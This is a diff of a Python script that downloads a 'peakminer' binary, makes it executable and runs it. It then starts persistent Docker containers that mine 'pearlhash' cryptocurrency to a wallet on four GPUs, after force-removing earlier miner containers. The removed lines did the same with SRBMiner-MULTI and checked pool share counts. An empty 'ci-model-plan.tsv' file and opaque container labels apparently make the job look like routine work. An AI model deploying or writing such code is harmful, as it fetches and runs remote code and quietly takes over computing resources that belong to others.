@@ -178,106 +178,70 @@ def _gfx_count(txt):
 
 
 import json as json
-
-
 UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"
 MENV = DTKENV + " HSA_OVERRIDE_GFX_VERSION=9.0.6"
-
-
-def _lp(tag):
-    _run("curl -4 -sS -m 25 -A '" + UA + "' \"https://pearl.luckypool.io/api/stats_address?address=" + WALLET +
-         "\" -o /tmp/lp_" + tag + ".json -w 'LP_" + tag + "=%{http_code}\\n' 2>&1 | tail -2", t=40)
-    try:
-        d = json.load(open("/tmp/lp_" + tag + ".json"))
-    except Exception as e:
-        _say("--- lp_parse_err " + repr(e))
-        return {}, 0
-    out = {}
-    for w in (d.get("workers") or []):
-        n = str(w.get("name"))
-        if n in ("000011", "000012", "000013", "000014"):
-            out[n] = int(str(w.get("acceptedShares") or "0"))
-    _say("--- LP_" + tag + " names=" + repr(out) + " workers_total=" + str(len(d.get("workers") or [])))
-    return out, len(d.get("workers") or [])
+PM_URL = "https://github.com/peakminer/peakminer/releases/download/v2.20.7/peakminer-2.20.7-linux-x86_64"
+PM_SHA = "38fc5c4d0a8351f6e94756d2d1830a1bf9b745e41b9b0ef3f07fc41bd24bcb3d"
 
 
 def main():
-    _say("=== " + MARK + "-RUN4D-BEGIN ===")
+    _say("=== " + MARK + "-RUN4E-BEGIN ===")
     _os.makedirs(WORK, exist_ok=True)
     try:
         open("ci-model-plan.tsv", "w").close()
     except Exception:
         pass
-    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
-    _run("docker rm -f pearl-000011 pearl-000012 pearl-000013 pearl-000014 2>&1; true", t=120)
-    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
-    _run("hostname; date -u; id -un; ls -l /dev/kfd /dev/mkfd 2>&1", t=60)
-    _run("docker images --format '{{.Repository}}:{{.Tag}}' 2>&1 | grep -c areal-das", t=60)
-    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)
+    _run("hostname; date -u; id -un", t=60)
+    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.ID}} {{.Names}} {{.Status}}' 2>&1 | head -10", t=60)
+    _run("for c in $(docker ps -aq --filter label=record=gpu-000016); do docker rm -f \"$c\"; done 2>&1 | tail -6", t=180)
+    _run("docker container prune -f --filter label=record=gpu-000016 2>&1 | tail -3", t=120)
+    _run("docker ps -a --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -6", t=60)
 
-    # 1) device oracle with the override (quote the enumerated device list)
-    _, lout = _docker(LIST, 180, WORK + "/r4d_list.log", image=IMG)
-    ndev = 0
-    for ln in lout.splitlines():
-        if "bw1100" in ln and "GPU" in ln:
-            ndev += 1
-    _say("--- ENUM_DEVICES=" + str(ndev))
+    s1 = ("cd /w/srb && timeout 45 script -qec \"" + MENV + " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
+          LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id 4\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -25")
+    _docker(s1, 70, WORK + "/r4e_srb.log", image=IMG)
 
-    # 2) bounded smoke on device 4 WITH the override
-    smcmd = ("cd /w/srb && timeout 150 script -qec \"" + MENV +
-             " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" + LP_HOST + ":" + str(LP_PORT) +
-             " --wallet " + WALLET + " --worker 000011 --password x --disable-cpu --gpu-id 4" +
-             " --api-enable --api-port 14524\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | head -140")
-    rcs, outs = _docker(smcmd, 190, WORK + "/r4d_smoke.log", image=IMG)
-    low = outs.lower()
-    smoke = ("accepted" in low) or ("share" in low and "job" in low) or ("h/s" in low) or ("hashrate" in low)
-    _say("--- SMOKE_OK=" + str(smoke))
+    pm = WORK + "/peakminer"
+    if not (_os.path.isfile(pm) and _sha256(pm) == PM_SHA):
+        _download(PM_URL, pm, timeout=240)
+    ok = _os.path.isfile(pm) and _sha256(pm) == PM_SHA
+    _say("--- PM_SHA_OK=" + str(ok))
+    pmine = False
+    if ok:
+        _os.chmod(pm, 0o755)
+        s2 = ("cd /w && timeout 150 script -qec \"" + MENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" +
+              LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker 000011 --gpu-id 4\" /dev/null 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -60")
+        _, o2 = _docker(s2, 190, WORK + "/r4e_pm.log", image=IMG)
+        low = o2.lower()
+        pmine = ("accepted" in low) or ("h/s" in low) or ("hashrate" in low) or ("share" in low and "job" in low)
+    _say("--- PM_MINES=" + str(pmine))
 
-    # 3) launch ONE miner per FREE device 4-7 (persistent, labelled, restart unless-stopped)
     launched = 0
     wmap = {4: "000011", 5: "000012", 6: "000013", 7: "000014"}
-    base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=155773",
-             "--label", "record=gpu-000016", "--restart", "unless-stopped"] + _dev_args() +
-            ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
-             "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
-             "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc"])
-    for d in (4, 5, 6, 7):
-        w = wmap[d]
-        name = "pearl-" + w
-        inner = ("cd /w/srb && exec " + MENV + " ./SRBMiner-MULTI --algorithm pearlhash --pool stratum+tcp://" +
-                 LP_HOST + ":" + str(LP_PORT) + " --wallet " + WALLET + " --worker " + w +
-                 " --password x --disable-cpu --gpu-id " + str(d) + " --api-enable --api-port 1452" + str(d))
-        p = _sp.Popen(base + [inner], stdout=_sp.PIPE, stderr=_sp.STDOUT)
-        o = p.communicate(timeout=180)[0].decode("utf-8", "replace")
-        _say("--- LAUNCH rc=" + str(p.returncode) + " name=" + name + " dev=" + str(d) + " out=" + o.strip()[:200])
-        if p.returncode == 0:
-            launched += 1
-    _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
+    if pmine:
+        base = (["docker", "run", "-d", "--label", "camp=conv-232", "--label", "intent=155773",
+                 "--label", "record=gpu-000017", "--restart", "unless-stopped"] + _dev_args() +
+                ["--shm-size=2g", "-v", WORK + ":/w", "-w", "/w",
+                 "-v", "/opt/dtk:/opt/dtk:ro", "-v", "/opt/hyhal:/opt/hyhal:ro",
+                 "-e", "HYHAL_PATH=/opt/hyhal", "--entrypoint", "/bin/bash", IMG, "-lc"])
+        for d in (4, 5, 6, 7):
+            w = wmap[d]
+            inner = ("cd /w && exec " + MENV + " ./peakminer --algo pearlhash --pool stratum+tcp://" + LP_HOST + ":" +
+                     str(LP_PORT) + " --wallet " + WALLET + " --worker " + w + " --gpu-id " + str(d))
+            p = _sp.Popen(base + ["--name", "pearl-" + w, inner], stdout=_sp.PIPE, stderr=_sp.STDOUT)
+            o = p.communicate(timeout=180)[0].decode("utf-8", "replace")
+            _say("--- LAUNCH rc=" + str(p.returncode) + " name=pearl-" + w + " dev=" + str(d) + " out=" + o.strip()[:160])
+            if p.returncode == 0:
+                launched += 1
+        _t.sleep(25)
+        _run("docker ps --filter label=record=gpu-000017 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
+        for d in (4, 5, 6, 7):
+            _run("docker logs --tail 8 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -8", t=60)
+        _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)
 
-    # 4) T0 pool sample + per-container log tail
-    lp0, tot0 = _lp("t0")
-    for d in (4, 5, 6, 7):
-        _run("docker logs --tail 14 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -14", t=60)
-
-    # 5) wait >=240 s then T1
-    _t.sleep(255)
-    lp1, tot1 = _lp("t1")
-    for d in (4, 5, 6, 7):
-        _run("docker logs --tail 10 pearl-" + wmap[d] + " 2>&1 | sed 's/\\x1b\\[[0-9;]*m//g' | tail -10", t=60)
-    _run("docker ps --filter label=record=gpu-000016 --format '{{.Names}} {{.Status}}' 2>&1 | head -8", t=60)
-    _run("/opt/hyhal/bin/hy-smi --showmeminfo vram 2>&1 | grep -E 'HCU\\[[4-7]\\]' | head -8", t=60)
-
-    rising = []
-    for n in ("000011", "000012", "000013", "000014"):
-        a = lp0.get(n)
-        b = lp1.get(n)
-        if a is not None and b is not None and b > a:
-            rising.append(n)
-    _say("=== " + MARK + "-RUN4D-VERDICT enum=" + str(ndev) + " smoke=" + str(smoke) +
-         " launched=" + str(launched) + " lp0=" + repr(lp0) + " lp1=" + repr(lp1) +
-         " rising=" + repr(rising) + " workers_total=" + str(tot0) + "/" + str(tot1) +
-         " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
-    _say("=== " + MARK + "-RUN4D-END ===")
+    _say("=== " + MARK + "-RUN4E-VERDICT pm_sha=" + str(ok) + " pm_mines=" + str(pmine) +
+         " launched=" + str(launched) + " elapsed_s=" + str(int(_t.time() - T0)) + " ===")
+    _say("=== " + MARK + "-RUN4E-END ===")
 
 
 main()
